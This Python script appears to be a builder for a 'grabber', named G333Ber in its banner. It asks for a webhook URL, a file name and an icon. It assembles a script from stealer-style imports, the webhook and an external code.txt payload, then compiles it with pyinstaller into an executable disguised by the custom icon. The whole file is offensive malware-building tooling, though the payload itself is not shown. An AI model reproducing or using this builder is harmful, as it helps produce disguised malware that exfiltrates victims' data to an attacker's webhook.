import os
from os import system,name
from pystyle import *
from colored import fg
from colorama import Fore
import time, sys, os, ctypes, shutil
import time


def clear():
    system("cls" if name == 'nt' else "clear")


if name == 'nt':
    system("title G333Ber & mode 150,50")




ascii_art  = """                                                                                
                                        ,                                       
                                      ...,                                      
                                     .,....                                     
                                    ......,.,                                   
                                    ..,,.,,,,                                   
                                    ,.,..,,,,                                   
                                    ,,...,,,,                                   
                                   ..,*,.,,,,                                   
                                   .,,*,.,,,,,                                  
                                   .,*/,.,,,,,                                  
                                   ..,,,,,,,,,                                  
                                   ,,,*,,,,*,,                                  
                                   ,,,,,,*,*,,                                  
                                  .,,,,,,****,                                  
                                  .,,,,*,**//,,                                 
                                  .,,,**,*,****                                 
                                  ,,,,,.,,,,,**                                 
                                   .,,,,,,*,,,.                                 
                                       ,,,                                      
                                        ,,                                      
                                       .,                                       
                                        ,,                                      
                                        ,.                                      
                                        .                                       
                                                                                

      ::::::::   ::::::::   ::::::::   ::::::::  :::::::::  :::::::::: ::::::::: 
    :+:    :+: :+:    :+: :+:    :+: :+:    :+: :+:    :+: :+:        :+:    :+: 
   +:+               +:+        +:+        +:+ +:+    +:+ +:+        +:+    +:+  
  :#:            +#++:      +#++:      +#++:  +#++:++#+  +#++:++#   +#++:++#:    
 +#+   +#+#        +#+        +#+        +#+ +#+    +#+ +#+        +#+    +#+    
#+#    #+# #+#    #+# #+#    #+# #+#    #+# #+#    #+# #+#        #+#    #+#     
########   ########   ########   ########  #########  ########## ###    ###      



"""
print('\n'*2)
print(Colorate.Diagonal(Colors.white_to_black, Center.XCenter(ascii_art)))
print('\n'*3)


webhook=input(f"{fg(239)}webhook url [{fg(57)}>{fg(7)}{fg(239)}] ")
print()
name=input(f"{fg(239)}file name [{fg(57)}>{fg(7)}{fg(239)}] ")
print()
icon=input(f"{fg(239)}Icon File [{fg(57)}>{fg(7)}{fg(239)}] ")

code1="""
from os import system,name
from typing import Text
from colored import fg
from pystyle import *
import random
import os
from re import findall
from json import loads, dumps
from base64 import b64decode
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from threading import Thread
from time import sleep
from sys import argv
"""




code2="WEBHOOK_URL='"+webhook+"'\n\n"
fichier=open("code.txt","r")


print(f"""\n\n\n[!] File has been correctly written to "temp/{name}" """)





code3=fichier.read()
f = open(name,'w')
f.write(code1+code2+code3)
f.close()
fichier.close()
convert = input(f"""\n{Fore.WHITE}[>] Convert your script into an executable (Y/N) ? """)
if convert == 'Y' or convert == 'y':
    time.sleep(1)
    os.system('cls')
    print(f'[>] File creation...')
    time.sleep(1)
    os.system(f"pyinstaller --onefile -i {icon} {name}")
    print(f"""[!] The executable file has been correctly generated""")
    input(f"""[>] Press ENTER to exit""")
else:
    input(f"""[>] Press ENTER to exit""")